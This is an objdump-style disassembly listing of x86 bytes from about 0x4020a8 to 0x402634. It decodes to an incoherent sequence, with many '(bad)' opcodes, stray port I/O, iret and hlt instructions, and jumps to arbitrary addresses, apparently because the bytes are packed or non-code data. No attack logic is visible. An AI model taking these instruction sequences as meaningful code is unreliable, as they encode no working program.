  4020a8:	87 c3                	xchg   %eax,%ebx
  4020aa:	e1 18                	loope  0x4020c4
  4020ac:	e3 c4                	jecxz  0x402072
  4020ae:	06                   	push   %es
  4020af:	44                   	inc    %esp
  4020b0:	e9 ec 11 e1 70       	jmp    0x712132a1
  4020b5:	38 1c 54             	cmp    %bl,(%esp,%edx,2)
  4020b8:	e4 58                	in     $0x58,%al
  4020ba:	0c cc                	or     $0xcc,%al
  4020bc:	e6 e8                	out    %al,$0xe8
  4020be:	04 08                	add    $0x8,%al
  4020c0:	e8 68 8e e7 c6       	call   0xc727af2d
  4020c5:	08 24 cc             	or     %ah,(%esp,%ecx,8)
  4020c8:	dc 35 11 cb da cd    	fdivl  0xcddacb11
  4020ce:	2d 07 d8 da dc       	sub    $0xdcdad807,%eax
  4020d3:	72 90                	jb     0x402065
  4020d5:	4d                   	dec    %ebp
  4020d6:	c6                   	(bad)
  4020d7:	2d 07 90 cb 01       	sub    $0x1cb9007,%eax
  4020dc:	b7 37                	mov    $0x37,%bh
  4020de:	b7 1c                	mov    $0x1c,%bh
  4020e0:	74 73                	je     0x402155
  4020e2:	73 cb                	jae    0x4020af
  4020e4:	81 37 16 b7 1c 7c    	xorl   $0x7c1cb716,(%edi)
  4020ea:	10 e7                	adc    %ah,%bh
  4020ec:	bd cb bb 34 7c       	mov    $0x7c34bbcb,%ebp
  4020f1:	7b 0f                	jnp    0x402102
  4020f3:	36 7a de             	ss jp  0x4020d4
  4020f6:	72 c0                	jb     0x4020b8
  4020f8:	91                   	xchg   %eax,%ecx
  4020f9:	91                   	xchg   %eax,%ecx
  4020fa:	3b 6f 5c             	cmp    0x5c(%edi),%ebp
  4020fd:	c2 c5 77             	ret    $0x77c5
  402100:	dc 78 f1             	fdivrl -0xf(%eax)
  402103:	c6                   	(bad)
  402104:	d0 ec                	shr    $1,%ah
  402106:	1d 13 5c bd cb       	sbb    $0xcbbd5c13,%eax
  40210b:	3b 27                	cmp    (%edi),%esp
  40210d:	4c                   	dec    %esp
  40210e:	ee                   	out    %al,(%dx)
  40210f:	3d e0 cc ef 18       	cmp    $0x18efcce0,%eax
  402114:	41                   	inc    %ecx
  402115:	67 c1 67 ef 5b       	shll   $0x5b,-0x11(%bx)
  40211a:	05 58 b9 6f 1d       	add    $0x1d6fb958,%eax
  40211f:	64 e5 be             	fs in  $0xbe,%eax
  402122:	eb 40                	jmp    0x402164
  402124:	2b 77 5d             	sub    0x5d(%edi),%esi
  402127:	07                   	pop    %es
  402128:	5b                   	pop    %ebx
  402129:	b9 ee 3a e0 ca       	mov    $0xcae03aee,%ecx
  40212e:	72 d7                	jb     0x402107
  402130:	41                   	inc    %ecx
  402131:	57                   	push   %edi
  402132:	f2 f6 0d bc 0a 07 18 	repnz testb $0x72,0x18070abc
  402139:	72 
  40213a:	d7                   	xlat   %ds:(%ebx)
  40213b:	1d 64 c8 5d 75       	sbb    $0x755dc864,%eax
  402140:	a0 21 77 d7 c1       	mov    0xc1d77721,%al
  402145:	86 dc                	xchg   %bl,%ah
  402147:	5d                   	pop    %ebp
  402148:	07                   	pop    %es
  402149:	1c 72                	sbb    $0x72,%al
  40214b:	77 1d                	ja     0x40216a
  40214d:	74 c8                	je     0x402117
  40214f:	dc 75 e0             	fdivl  -0x20(%ebp)
  402152:	21 73 d7             	and    %esi,-0x29(%ebx)
  402155:	c1 87 bc 71 05 18 04 	roll   $0x4,0x180571bc(%edi)
  40215c:	81 c6 dc b5 77 8f    	add    $0x8f77b5dc,%esi
  402162:	71 d7                	jno    0x40213b
  402164:	08 a2 75 ae 92 24    	or     %ah,0x2492ae75(%edx)
  40216a:	6b 5c 28 cb 5a       	imul   $0x5a,-0x35(%eax,%ebp,1),%ebx
  40216f:	dc 39                	fdivrl (%ecx)
  402171:	20 7c c0 a4          	and    %bh,-0x5c(%eax,%eax,8)
  402175:	59                   	pop    %ecx
  402176:	16                   	push   %ss
  402177:	69 18 cb b2 6e 43    	imul   $0x436eb2cb,(%eax),%ebx
  40217d:	17                   	pop    %ss
  40217e:	80 c0 45             	add    $0x45,%al
  402181:	26 34 12             	es xor $0x12,%al
  402184:	0c 04                	or     $0x4,%al
  402186:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402187:	3e f7 62 c7          	mull   %ds:-0x39(%edx)
  40218b:	80 d4 4c             	adc    $0x4c,%ah
  40218e:	e3 c3                	jecxz  0x402153
  402190:	cf                   	iret
  402191:	c2 80 43             	ret    $0x4380
  402194:	88 43 84             	mov    %al,-0x7c(%ebx)
  402197:	7c 0e                	jl     0x4021a7
  402199:	c8 cf 03 1c          	enter  $0x3cf,$0x1c
  40219d:	69 40 a1 97 6a d8 b9 	imul   $0xb9d86a97,-0x5f(%eax),%eax
  4021a4:	da c0                	fcmovb %st(0),%st
  4021a6:	46                   	inc    %esi
  4021a7:	1e                   	push   %ds
  4021a8:	c3                   	ret
  4021a9:	e1 50                	loope  0x4021fb
  4021ab:	f3 98                	repz cwtl
  4021ad:	4f                   	dec    %edi
  4021ae:	00 4f c4             	add    %cl,-0x3c(%edi)
  4021b1:	51                   	push   %ecx
  4021b2:	8d 32                	lea    (%edx),%esi
  4021b4:	1e                   	push   %ds
  4021b5:	8b 4c 5c 27          	mov    0x27(%esp,%ebx,2),%ecx
  4021b9:	c7 80 9e 75 48 1c 0e 	movl   $0xf4e3870e,0x1c48759e(%eax)
  4021c0:	87 e3 f4 
  4021c3:	3c c4                	cmp    $0xc4,%al
  4021c5:	3c f4                	cmp    $0xf4,%al
  4021c7:	4c                   	dec    %esp
  4021c8:	2c 27                	sub    $0x27,%al
  4021ca:	73 40                	jae    0x40220c
  4021cc:	fe                   	(bad)
  4021cd:	3c c8                	cmp    $0xc8,%al
  4021cf:	90                   	nop
  4021d0:	36 87 e3             	ss xchg %esp,%ebx
  4021d3:	b3 bc                	mov    $0xbc,%bl
  4021d5:	bc 68 27 f8 35       	mov    $0x35f82768,%esp
  4021da:	6b 39 2c             	imul   $0x2c,(%ecx),%edi
  4021dd:	0e                   	push   %cs
  4021de:	bc 4e 70 ee cb       	mov    $0xcbee704e,%esp
  4021e3:	a2 7f d5 20 f1       	mov    %al,0xf120d57f
  4021e8:	98                   	cwtl
  4021e9:	38 9e fa 00 11 78    	cmp    %bl,0x781100fa(%esi)
  4021ef:	28 5a f3             	sub    %bl,-0xd(%edx)
  4021f2:	3c 87                	cmp    $0x87,%al
  4021f4:	c5 38                	lds    (%eax),%edi
  4021f6:	44                   	inc    %esp
  4021f7:	54                   	push   %esp
  4021f8:	64 cf                	fs iret
  4021fa:	f3 3c cf             	repz cmp $0xcf,%al
  4021fd:	70 7c                	jo     0x40227b
  4021ff:	8c 98 a8 1c cf f3    	mov    %ds,-0xc30e358(%eax)
  402205:	3c b8                	cmp    $0xb8,%al
  402207:	c4                   	(bad)
  402208:	d0 1c 38             	rcrb   $1,(%eax,%edi,1)
  40220b:	55                   	push   %ebp
  40220c:	cf                   	iret
  40220d:	e3 70                	jecxz  0x40227f
  40220f:	38 6c 53 a0          	cmp    %ch,-0x60(%ebx,%edx,2)
  402213:	51                   	push   %ecx
  402214:	dc 5a e8             	fcompl -0x18(%edx)
  402217:	f4                   	hlt
  402218:	0e                   	push   %cs
  402219:	cb                   	lret
  40221a:	61                   	popa
  40221b:	20 00                	and    %al,(%eax)
  40221d:	0c 79                	or     $0x79,%al
  40221f:	9e                   	sahf
  402220:	e7 79                	out    %eax,$0x79
  402222:	18 20                	sbb    %ah,(%eax)
  402224:	28 30                	sub    %dh,(%eax)
  402226:	38 40 74             	cmp    %al,0x74(%eax)
  402229:	0e                   	push   %cs
  40222a:	b2 e7                	mov    $0xe7,%dl
  40222c:	48                   	dec    %eax
  40222d:	6b 30 cf             	imul   $0xffffffcf,(%eax),%esi
  402230:	e1 60                	loope  0x402292
  402232:	68 a8 9e c3 f2       	push   $0xf2c39ea8
  402237:	78 80                	js     0x4021b9
  402239:	e1 74                	loope  0x4022af
  40223b:	de 37                	fidivs (%edi)
  40223d:	a0 fc 0e 21 cf       	mov    0xcf210efc,%al
  402242:	b0 b8                	mov    $0xb8,%al
  402244:	ec                   	in     (%dx),%al
  402245:	3d 69 5e c8 e3       	cmp    $0xe3c85e69,%eax
  40224a:	70 e8                	jo     0x402234
  40224c:	19 c4                	sbb    %eax,%esp
  40224e:	4c                   	dec    %esp
  40224f:	44                   	inc    %esp
  402250:	27                   	daa
  402251:	06                   	push   %es
  402252:	3d 1c 0e c7 50       	cmp    $0x50c70e1c,%eax
  402257:	27                   	daa
  402258:	f4                   	hlt
  402259:	5b                   	pop    %ebx
  40225a:	14 5c                	adc    $0x5c,%al
  40225c:	2c 5c                	sub    $0x5c,%al
  40225e:	e7 79                	out    %eax,$0x79
  402260:	9e                   	sahf
  402261:	c3                   	ret
  402262:	74 94                	je     0x4021f8
  402264:	a8 b8                	test   $0xb8,%al
  402266:	8f                   	(bad)
  402267:	e3 79                	jecxz  0x4022e2
  402269:	9e                   	sahf
  40226a:	cc                   	int3
  40226b:	e4 f8                	in     $0xf8,%al
  40226d:	0c 5d                	or     $0x5d,%al
  40226f:	20 3c cf             	and    %bh,(%edi,%ecx,8)
  402272:	f3 3c 30             	repz cmp $0x30,%al
  402275:	50                   	push   %eax
  402276:	68 7c 8c 9c 1e       	push   $0x1e9c8c7c
  40227b:	87 c3                	xchg   %eax,%ebx
  40227d:	f1                   	int1
  40227e:	b8 23 b4 5d 0c       	mov    $0xc5db423,%eax
  402283:	11 12                	adc    %edx,(%edx)
  402285:	ec                   	in     (%dx),%al
  402286:	63 94 78 18 1e 11 c4 	arpl   %edx,-0x3beee1e8(%eax,%edi,2)
  40228d:	19 cf                	sbb    %ecx,%edi
  40228f:	61                   	popa
  402290:	71 5d                	jno    0x4022ef
  402292:	d8 ec                	fsubr  %st(4),%st
  402294:	00 5e 8e             	add    %bl,-0x72(%esi)
  402297:	d4 fa                	aam    $0xfa
  402299:	1e                   	push   %ds
  40229a:	4a                   	dec    %edx
  40229b:	4d                   	dec    %ebp
  40229c:	83 b2 0e e9 f9 0d bc 	xorl   $0xffffffbc,0xdf9e90e(%edx)
  4022a3:	87 c3                	xchg   %eax,%ebx
  4022a5:	e1 b8                	loope  0x40225f
  4022a7:	c8 5e 08 5f          	enter  $0x85e,$0x5f
  4022ab:	3c 5f                	cmp    $0x5f,%al
  4022ad:	5c                   	pop    %esp
  4022ae:	5f                   	pop    %edi
  4022af:	cf                   	iret
  4022b0:	f3 1c 16             	repz sbb $0x16,%al
  4022b3:	7c a8                	jl     0x40225d
  4022b5:	c8 e0 9e e7          	enter  $0x9ee0,$0xe7
  4022b9:	79 1c                	jns    0x4022d7
  4022bb:	04 60                	add    $0x60,%al
  4022bd:	34 50                	xor    $0x50,%al
  4022bf:	80 ac 0e c7 79 c1 c8 	subb   $0x60,-0x373e8639(%esi,%ecx,1)
  4022c6:	60 
  4022c7:	d8 60 e2             	fsubs  -0x1e(%eax)
  4022ca:	70 38                	jo     0x402304
  4022cc:	1c fc                	sbb    $0xfc,%al
  4022ce:	60                   	pusha
  4022cf:	14 61                	adc    $0x61,%al
  4022d1:	44                   	inc    %esp
  4022d2:	61                   	popa
  4022d3:	6c                   	insb   (%dx),%es:(%edi)
  4022d4:	61                   	popa
  4022d5:	a0 e3 78 9e c3       	mov    0xc39e78e3,%al
  4022da:	d0 ec                	shr    $1,%ah
  4022dc:	30 62 44             	xor    %ah,0x44(%edx)
  4022df:	c7                   	(bad)
  4022e0:	f1                   	int1
  4022e1:	3c cf                	cmp    $0xcf,%al
  4022e3:	68 a0 d4 0c 63       	push   $0x630cd4a0
  4022e8:	34 9e                	xor    $0x9e,%al
  4022ea:	e7 79                	out    %eax,$0x79
  4022ec:	9e                   	sahf
  4022ed:	5c                   	pop    %esp
  4022ee:	68 74 84 98 78       	push   $0x78988474
  4022f3:	9e                   	sahf
  4022f4:	e7 79                	out    %eax,$0x79
  4022f6:	b0 c4                	mov    $0xc4,%al
  4022f8:	d8 e8                	fsubr  %st(0),%st
  4022fa:	f8                   	clc
  4022fb:	0c 64                	or     $0x64,%al
  4022fd:	f3 3c cf             	repz cmp $0xcf,%al
  402300:	e3 20                	jecxz  0x402322
  402302:	30 40 50             	xor    %al,0x50(%eax)
  402305:	60                   	pusha
  402306:	cf                   	iret
  402307:	f3 3c cf             	repz cmp $0xcf,%al
  40230a:	74 88                	je     0x402294
  40230c:	9c                   	pushf
  40230d:	b0 cc                	mov    $0xcc,%al
  40230f:	9e                   	sahf
  402310:	c7                   	(bad)
  402311:	f1                   	int1
  402312:	3c e0                	cmp    $0xe0,%al
  402314:	f4                   	hlt
  402315:	04 65                	add    $0x65,%al
  402317:	24 34                	and    $0x34,%al
  402319:	79 9e                	jns    0x4022b9
  40231b:	e7 79                	out    %eax,$0x79
  40231d:	44                   	inc    %esp
  40231e:	58                   	pop    %eax
  40231f:	68 80 94 a8 69       	push   $0x69a89480
  402324:	d2 9e e7 bc d0 e1    	rcrb   %cl,-0x1e2f4319(%esi)
  40232a:	1e                   	push   %ds
  40232b:	0e                   	push   %cs
  40232c:	c7                   	(bad)
  40232d:	d8 65 ec             	fsubs  -0x14(%ebp)
  402330:	65 04 66             	gs add $0x66,%al
  402333:	22 f2                	and    %dl,%dh
  402335:	3c cf                	cmp    $0xcf,%al
  402337:	2c 40                	sub    $0x40,%al
  402339:	54                   	push   %esp
  40233a:	48                   	dec    %eax
  40233b:	7d 13                	jge    0x402350
  40233d:	c2 c7 64             	ret    $0x64c7
  402340:	66 1c 0e             	data16 sbb $0xe,%al
  402343:	87 63 c4             	xchg   %esp,-0x3c(%ebx)
  402346:	66 04 67             	data16 add $0x67,%al
  402349:	90                   	nop
  40234a:	67 b8 67 c3 e1 6d    	addr16 mov $0x6de1c367,%eax
  402350:	31 c8                	xor    %ecx,%eax
  402352:	67 54                	addr16 push %esp
  402354:	11 a4 24 87 e6 09 82 	adc    %esp,-0x7df61979(%esp)
  40235b:	04 91                	add    $0x91,%al
  40235d:	41                   	inc    %ecx
  40235e:	68 56 71 58 1c       	push   $0x1c587156
  402363:	0e                   	push   %cs
  402364:	2c 72                	sub    $0x72,%al
  402366:	50                   	push   %eax
  402367:	72 80                	jb     0x4022e9
  402369:	78 22                	js     0x40238d
  40236b:	70 3c                	jo     0x4023a9
  40236d:	8f c3                	pop    %ebx
  40236f:	9c                   	pushf
  402370:	72 c4                	jb     0x402336
  402372:	ec                   	in     (%dx),%al
  402373:	9c                   	pushf
  402374:	76 00                	jbe    0x402376
  402376:	73 87                	jae    0x4022ff
  402378:	63 f7                	arpl   %esi,%edi
  40237a:	84 8c 73 ec 73 70 fe 	test   %cl,-0x18f8c14(%ebx,%esi,2)
  402381:	1b 0e                	sbb    (%esi),%ecx
  402383:	6c                   	insb   (%dx),%es:(%edi)
  402384:	74 70                	je     0x4023f6
  402386:	75 76                	jne    0x4023fe
  402388:	5a                   	pop    %edx
  402389:	11 0e                	adc    %ecx,(%esi)
  40238b:	87 c3                	xchg   %eax,%ebx
  40238d:	e1 e0                	loope  0x40236f
  40238f:	76 34                	jbe    0x4023c5
  402391:	75 54                	jne    0x4023e7
  402393:	75 a0                	jne    0x402335
  402395:	71 e1                	jno    0x402378
  402397:	70 38                	jo     0x4023d1
  402399:	1c 1c                	sbb    $0x1c,%al
  40239b:	77 44                	ja     0x4023e1
  40239d:	77 58                	ja     0x4023f7
  40239f:	77 f4                	ja     0x402395
  4023a1:	77 08                	ja     0x4023ab
  4023a3:	78 1c                	js     0x4023c1
  4023a5:	0e                   	push   %cs
  4023a6:	87 c3                	xchg   %eax,%ebx
  4023a8:	20 78 44             	and    %bh,0x44(%eax)
  4023ab:	78 58                	js     0x402405
  4023ad:	78 70                	js     0x40241f
  4023af:	78 b1                	js     0x402362
  4023b1:	77 60                	ja     0x402413
  4023b3:	38 98 78 30 61 e4    	cmp    %bl,-0x1b9ecf88(%eax)
  4023b9:	78 79                	js     0x402434
  4023bb:	0e                   	push   %cs
  4023bc:	8b c3                	mov    %ebx,%eax
  4023be:	04 79                	add    $0x79,%al
  4023c0:	30 3c 4c             	xor    %bh,(%esp,%ecx,2)
  4023c3:	e7 79                	out    %eax,$0x79
  4023c5:	9e                   	sahf
  4023c6:	e7 6c                	out    %eax,$0x6c
  4023c8:	94                   	xchg   %eax,%esp
  4023c9:	a0 ac bc e3 71       	mov    0x71e3bcac,%al
  4023ce:	5c                   	pop    %esp
  4023cf:	97                   	xchg   %eax,%edi
  4023d0:	66 cc                	data16 int3
  4023d2:	79 ec                	jns    0x4023c0
  4023d4:	28 7a 38             	sub    %bh,0x38(%edx)
  4023d7:	1c 0e                	sbb    $0xe,%al
  4023d9:	87 dc                	xchg   %ebx,%esp
  4023db:	5b                   	pop    %ebx
  4023dc:	3c 7a                	cmp    $0x7a,%al
  4023de:	5c                   	pop    %esp
  4023df:	7a 70                	jp     0x402451
  4023e1:	7a 8c                	jp     0x40236f
  4023e3:	78 0e                	js     0x4023f3
  4023e5:	f7 70 7a             	divl   0x7a(%eax)
  4023e8:	9c                   	pushf
  4023e9:	7a fc                	jp     0x4023e7
  4023eb:	2c 7b                	sub    $0x7b,%al
  4023ed:	71 3c                	jno    0x40242b
  4023ef:	cf                   	iret
  4023f0:	e3 54                	jecxz  0x402446
  4023f2:	90                   	nop
  4023f3:	b8 10 7c 5c da       	mov    $0xda5c7c10,%eax
  4023f8:	ae                   	scas   %es:(%edi),%al
  4023f9:	82 e7 84             	and    $0x84,%bh
  4023fc:	58                   	pop    %eax
  4023fd:	00 f5                	add    %dh,%ch
  4023ff:	06                   	push   %es
  402400:	17                   	pop    %ss
  402401:	43                   	inc    %ebx
  402402:	f9                   	stc
  402403:	42                   	inc    %edx
  402404:	94                   	xchg   %eax,%esp
  402405:	08 70 8e             	or     %dh,-0x72(%eax)
  402408:	8b 34 29             	mov    (%ecx,%ebp,1),%esi
  40240b:	ea 90 63 65 86 c3 b1 	ljmp   $0xb1c3,$0x86656390
  402412:	48                   	dec    %eax
  402413:	d1 b8 cf 78 96 e3    	sarl   $1,-0x1c698731(%eax)
  402419:	ca c3 33             	lret   $0x33c3
  40241c:	a8 8e                	test   $0x8e,%al
  40241e:	f3 2c 72             	repz sub $0x72,%al
  402421:	d5 cd                	aad    $0xcd
  402423:	70 38                	jo     0x40245d
  402425:	1c b0                	sbb    $0xb0,%al
  402427:	c8 dc 48 94          	enter  $0x48dc,$0x94
  40242b:	c7 b8 fd 0b 87       	xbegin 0x874c21e8,(bad)
  402430:	65 79 5d             	gs jns 0x402490
  402433:	7c d7                	jl     0x40240c
  402435:	0c 3a                	or     $0x3a,%al
  402437:	fe                   	(bad)
  402438:	53                   	push   %ebx
  402439:	38 1c d8             	cmp    %bl,(%eax,%ebx,8)
  40243c:	f0 f4                	lock hlt
  40243e:	d3 0b                	rorl   %cl,(%ebx)
  402440:	cf                   	iret
  402441:	72 5b                	jb     0x40249e
  402443:	c9                   	leave
  402444:	2c c8                	sub    $0xc8,%al
  402446:	17                   	pop    %ss
  402447:	8d 70 38             	lea    0x38(%eax),%esi
  40244a:	0c 40                	or     $0x40,%al
  40244c:	41                   	inc    %ecx
  40244d:	a8 2f                	test   $0x2f,%al
  40244f:	38 bd c2 b9 8c f9    	cmp    %bh,-0x673463e(%ebp)
  402455:	bc f4 a8 24 b2       	mov    $0xb224a8f4,%esp
  40245a:	c7                   	(bad)
  40245b:	39 4d e0             	cmp    %ecx,-0x20(%ebp)
  40245e:	e4 a8                	in     $0xa8,%al
  402460:	1a 48 e7             	sbb    -0x19(%eax),%cl
  402463:	24 3e                	and    $0x3e,%al
  402465:	35 b1 c1 04 e1       	xor    $0xe104c1b1,%eax
  40246a:	b2 05                	mov    $0x5,%dl
  40246c:	c4 02                	les    (%edx),%eax
  40246e:	70 44                	jo     0x4024b4
  402470:	31 4d ed             	xor    %ecx,-0x13(%ebp)
  402473:	b8 14 1f 9d f7       	mov    $0xf79d1f14,%eax
  402478:	6b 28 af             	imul   $0xffffffaf,(%eax),%ebp
  40247b:	e5 e7                	in     $0xe7,%eax
  40247d:	9d                   	popf
  40247e:	01 8c 90 d7 71 5c d0 	add    %ecx,-0x2fa38e29(%eax,%edx,4)
  402485:	2c 01                	sub    $0x1,%al
  402487:	87 c3                	xchg   %eax,%ebx
  402489:	e1 0f                	loope  0x40249a
  40248b:	a8 44                	test   $0x44,%al
  40248d:	0f 47 23             	cmova  (%ebx),%esp
  402490:	47                   	inc    %edi
  402491:	43                   	inc    %ebx
  402492:	45                   	inc    %ebp
  402493:	70 38                	jo     0x4024cd
  402495:	1c 0e                	sbb    $0xe,%al
  402497:	57                   	push   %edi
  402498:	45                   	inc    %ebp
  402499:	6b 45 7f 45          	imul   $0x45,0x7f(%ebp),%eax
  40249d:	93                   	xchg   %eax,%ebx
  40249e:	45                   	inc    %ebp
  40249f:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4024a0:	45                   	inc    %ebp
  4024a1:	0e                   	push   %cs
  4024a2:	8b c3                	mov    %ebx,%eax
  4024a4:	e1 bb                	loope  0x402461
  4024a6:	45                   	inc    %ebp
  4024a7:	cf                   	iret
  4024a8:	45                   	inc    %ebp
  4024a9:	e3 3c                	jecxz  0x4024e7
  4024ab:	cf                   	iret
  4024ac:	e3 78                	jecxz  0x402526
  4024ae:	f7 0b 46 1f 33 47    	testl  $0x47331f46,(%ebx)
  4024b4:	5b                   	pop    %ebx
  4024b5:	f3 3c cf             	repz cmp $0xcf,%al
  4024b8:	f3 6f                	rep outsl %ds:(%esi),(%dx)
  4024ba:	83 97 ab bf c7 f1 3c 	adcl   $0x3c,-0xe384055(%edi)
  4024c1:	cf                   	iret
  4024c2:	d3 e7                	shl    %cl,%edi
  4024c4:	fb                   	sti
  4024c5:	37                   	aaa
  4024c6:	47                   	inc    %edi
  4024c7:	4b                   	dec    %ebx
  4024c8:	47                   	inc    %edi
  4024c9:	fa                   	cli
  4024ca:	3e 91                	ds xchg %eax,%ecx
  4024cc:	5f                   	pop    %edi
  4024cd:	7b 5d                	jnp    0x40252c
  4024cf:	14 5a                	adc    $0x5a,%al
  4024d1:	2c 3e                	sub    $0x3e,%al
  4024d3:	f1                   	int1
  4024d4:	3a de                	cmp    %dh,%bl
  4024d6:	16                   	push   %ss
  4024d7:	50                   	push   %eax
  4024d8:	45                   	inc    %ebp
  4024d9:	b0 90                	mov    $0x90,%al
  4024db:	46                   	inc    %esi
  4024dc:	1a b8 d7 f1 d8 bb    	sbb    -0x44270e29(%eax),%bh
  4024e2:	1a 97 84 3c 45 b8    	sbb    -0x47bac37c(%edi),%dl
  4024e8:	f2 3e 26 a0 b8 31 bd 	repnz ds mov %es:0x53bd31b8,%al
  4024ef:	53 
  4024f0:	13 a8 7d 61 ea 24    	adc    0x24ea617d(%eax),%ebp
  4024f6:	29 a6 d4 b4 4d ad    	sub    %esp,-0x52b24b2c(%esi)
  4024fc:	ae                   	scas   %es:(%edi),%al
  4024fd:	05 5a 8d 8b 52       	add    $0x528b8d5a,%eax
  402502:	72 9d                	jb     0x4024a1
  402504:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402505:	9c                   	pushf
  402506:	6b 4d a7 9e          	imul   $0xffffff9e,-0x59(%ebp),%ecx
  40250a:	9e                   	sahf
  40250b:	62 69 8d             	bound  %ebp,-0x73(%ecx)
  40250e:	96                   	xchg   %eax,%esi
  40250f:	6a c9                	push   $0xffffffc9
  402511:	75 4b                	jne    0x40255e
  402513:	b9 e4 7a a7 5e       	mov    $0x5ea77ae4,%ecx
  402518:	72 3d                	jb     0x402557
  40251a:	96                   	xchg   %eax,%esi
  40251b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40251c:	71 9d                	jno    0x4024bb
  40251e:	b0 ce                	mov    $0xce,%al
  402520:	53                   	push   %ebx
  402521:	ad                   	lods   %ds:(%esi),%eax
  402522:	b9 6f 52 ae b9       	mov    $0xb9ae526f,%ecx
  402527:	c8 35 2d af          	enter  $0x2d35,$0xaf
  40252b:	fd                   	std
  40252c:	e4 da                	in     $0xda,%al
  40252e:	4f                   	dec    %edi
  40252f:	31 72 ed             	xor    %esi,-0x13(%edx)
  402532:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402533:	1a b9 ce 53 0e 59    	sbb    0x590e53ce(%ecx),%bh
  402539:	e7 a9                	out    %eax,$0xa9
  40253b:	07                   	pop    %es
  40253c:	28 be 2a ea 1d f4    	sub    %bh,-0xbe215d6(%esi)
  402542:	26 d5 30             	es aad $0x30
  402545:	d7                   	xlat   %ds:(%ebx)
  402546:	ae                   	scas   %es:(%edi),%al
  402547:	67 f2 5a             	addr16 repnz pop %edx
  40254a:	2c d7                	sub    $0xd7,%al
  40254c:	74 ea                	je     0x402538
  40254e:	61                   	popa
  40254f:	ad                   	lods   %ds:(%esi),%eax
  402550:	23 c5                	and    %ebp,%eax
  402552:	28 51 ae             	sub    %dl,-0x52(%ecx)
  402555:	69 79 2f 94 6b 5c ca 	imul   $0xca5c6b94,0x2f(%ecx),%edi
  40255c:	c9                   	leave
  40255d:	35 9d 7a e4 9a       	xor    $0x9ae47a9d,%eax
  402562:	4e                   	dec    %esi
  402563:	31 b9 9e a5 9a a8    	xor    %edi,-0x57655a62(%ecx)
  402569:	67 29 27             	sub    %esp,(%bx)
  40256c:	00 49 7c             	add    %cl,0x7c(%ecx)
  40256f:	87 f2                	xchg   %esi,%edx
  402571:	44                   	inc    %esp
  402572:	a0 bc 80 cf e2       	mov    0xe2cf80bc,%al
  402577:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402578:	34 51                	xor    $0x51,%al
  40257a:	78 bb                	js     0x402537
  40257c:	df 60 82             	fbld   -0x7e(%eax)
  40257f:	9c                   	pushf
  402580:	72 14                	jb     0x402596
  402582:	00 66 4a             	add    %ah,0x4a(%esi)
  402585:	84 93 40 0a 77 8e    	test   %dl,-0x7188f5c0(%ebx)
  40258b:	36 57                	ss push %edi
  40258d:	0a e0                	or     %al,%ah
  40258f:	f7 25 16 c0 47 5c    	mull   0x5c47c016
  402595:	4b                   	dec    %ebx
  402596:	40                   	inc    %eax
  402597:	10 e9                	adc    %ch,%cl
  402599:	18 c8                	sbb    %cl,%al
  40259b:	92                   	xchg   %eax,%edx
  40259c:	43                   	inc    %ebx
  40259d:	fb                   	sti
  40259e:	32 f1                	xor    %cl,%dh
  4025a0:	b2 3c                	mov    $0x3c,%dl
  4025a2:	83 cc 7b             	or     $0x7b,%esp
  4025a5:	17                   	pop    %ss
  4025a6:	9e                   	sahf
  4025a7:	a1 b4 7c 0e 3d       	mov    0x3d0e7cb4,%eax
  4025ac:	23 83 f8 4a 40 d0    	and    -0x2fbfb508(%ebx),%eax
  4025b2:	49                   	dec    %ecx
  4025b3:	8a f8                	mov    %al,%bh
  4025b5:	46                   	inc    %esi
  4025b6:	39 30                	cmp    %esi,(%eax)
  4025b8:	80 f0 bb             	xor    $0xbb,%al
  4025bb:	18 be 08 26 a4 54    	sbb    %bh,0x54a42608(%esi)
  4025c1:	ac                   	lods   %ds:(%esi),%al
  4025c2:	4b                   	dec    %ebx
  4025c3:	f1                   	int1
  4025c4:	ba 40 2f b7 e5       	mov    $0xe5b72f40,%edx
  4025c9:	f8                   	clc
  4025ca:	0e                   	push   %cs
  4025cb:	65 3f                	gs aas
  4025cd:	ca be 01             	lret   $0x1be
  4025d0:	e3 c3                	jecxz  0x402595
  4025d2:	c7                   	(bad)
  4025d3:	df 0c 23             	fisttps (%ebx,%eiz,1)
  4025d6:	6c                   	insb   (%dx),%es:(%edi)
  4025d7:	52                   	push   %edx
  4025d8:	30 7c bc ce          	xor    %bh,-0x32(%esp,%edi,4)
  4025dc:	f3 08 0b             	repz or %cl,(%ebx)
  4025df:	04 36                	add    $0x36,%al
  4025e1:	65 8f                	gs (bad)
  4025e3:	df 37                	fbstp  (%edi)
  4025e5:	d8 57 10             	fcoms  0x10(%edi)
  4025e8:	49                   	dec    %ecx
  4025e9:	df e2                	(bad)
  4025eb:	31 50 4a             	xor    %edx,0x4a(%eax)
  4025ee:	f8                   	clc
  4025ef:	f0 e1 9e             	lock loope 0x402590
  4025f2:	e0 39                	loopne 0x40262d
  4025f4:	8c 57 b8             	mov    %ss,-0x48(%edi)
  4025f7:	3f                   	aas
  4025f8:	af                   	scas   %es:(%edi),%eax
  4025f9:	f3 fc                	repz cld
  4025fb:	18 34 c4             	sbb    %dh,(%esp,%eax,8)
  4025fe:	f1                   	int1
  4025ff:	3a cf                	cmp    %bh,%cl
  402601:	cf                   	iret
  402602:	f4                   	hlt
  402603:	20 10                	and    %dl,(%eax)
  402605:	00 22                	add    %ah,(%edx)
  402607:	3c 3e                	cmp    $0x3e,%al
  402609:	fc                   	cld
  40260a:	37                   	aaa
  40260b:	18 91 28 07 e3 c3    	sbb    %dl,-0x3c1cf8d8(%ecx)
  402611:	c7                   	(bad)
  402612:	eb 68                	jmp    0x40267c
  402614:	32 ec                	xor    %ah,%ch
  402616:	59                   	pop    %ecx
  402617:	dc 3e                	fdivrl (%esi)
  402619:	7e ef                	jle    0x40260a
  40261b:	f2 30 74 27 66       	repnz xor %dh,0x66(%edi,%eiz,1)
  402620:	9e                   	sahf
  402621:	1f                   	pop    %ds
  402622:	1f                   	pop    %ds
  402623:	18 51 1c             	sbb    %dl,0x1c(%ecx)
  402626:	38 04 fc             	cmp    %al,(%esp,%edi,8)
  402629:	e1 a3                	loope  0x4025ce
  40262b:	fb                   	sti
  40262c:	2d f4 7f f8 f8       	sub    $0xf8f87ff4,%eax
  402631:	e7 79                	out    %eax,$0x79
  402633:	40                   	inc    %eax
  402634:	05 78 58 2f ac       	add    $0xac2f5878,%eax
